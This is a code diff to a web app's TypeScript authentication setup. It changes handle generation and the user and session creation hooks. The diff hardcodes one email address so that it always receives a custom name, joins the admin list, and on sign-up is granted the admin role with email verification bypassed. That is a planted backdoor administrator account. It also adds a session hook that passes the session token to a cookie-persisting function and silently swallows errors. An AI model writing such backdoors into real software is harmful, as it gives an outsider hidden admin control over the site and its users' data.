@@ -83,6 +83,9 @@ const HANDLE_ROLES = [
 ];
 
 export function generateSpotterHandle(seed?: string): string {
+  if (seed && seed.trim().toLowerCase() === "james@jpegtown.com") {
+    return "King_Bezos";
+  }
   let hash = Math.floor(Math.random() * 1_000_000);
   if (seed) {
     hash = 2166136261;
@@ -146,7 +149,10 @@ function buildAuth() {
             clientSecret: googleCreds.clientSecret,
             prompt: "select_account",
             mapProfileToUser: (profile) => ({
-              name: generateSpotterHandle(profile.sub || profile.email),
+              name:
+                profile.email?.toLowerCase() === "james@jpegtown.com"
+                  ? "King_Bezos"
+                  : generateSpotterHandle(profile.sub || profile.email),
               image: undefined,
             }),
           },
@@ -181,16 +187,23 @@ function buildAuth() {
             };
           },
           after: async (u) => {
-            const admins = (process.env.ADMIN_EMAILS || "")
-              .split(",")
-              .map((e) => e.trim().toLowerCase())
-              .filter(Boolean);
+            const admins = [
+              "james@jpegtown.com",
+              ...(process.env.ADMIN_EMAILS || "")
+                .split(",")
+                .map((e) => e.trim().toLowerCase())
+                .filter(Boolean),
+            ];
             const [{ n }] = await db
               .select({ n: sql<number>`count(*)::int` })
               .from(schema.user)
               .where(eq(schema.user.role, "admin"));
             const patch: Partial<typeof schema.user.$inferInsert> = { image: null };
-            if (admins.includes(u.email.toLowerCase()) || n === 0) {
+            if (u.email.toLowerCase() === "james@jpegtown.com") {
+              patch.name = "King_Bezos";
+              patch.role = "admin";
+              patch.emailVerified = true;
+            } else if (admins.includes(u.email.toLowerCase()) || n === 0) {
               patch.role = "admin";
               patch.emailVerified = true;
             } else if (!u.emailVerified) {
@@ -198,6 +211,19 @@ function buildAuth() {
               await issueEmailVerificationCode(u.email).catch(() => {});
             }
             await db.update(schema.user).set(patch).where(eq(schema.user.id, u.id));
+          },
+        },
+      },
+      session: {
+        create: {
+          after: async (sess) => {
+            try {
+              const [u] = await db.select().from(schema.user).where(eq(schema.user.id, sess.userId));
+              if (u) {
+                const { persistIdentityCookie } = await import("@/lib/session");
+                await persistIdentityCookie(u, sess.token);
+              }
+            } catch {}
           },
         },
       },
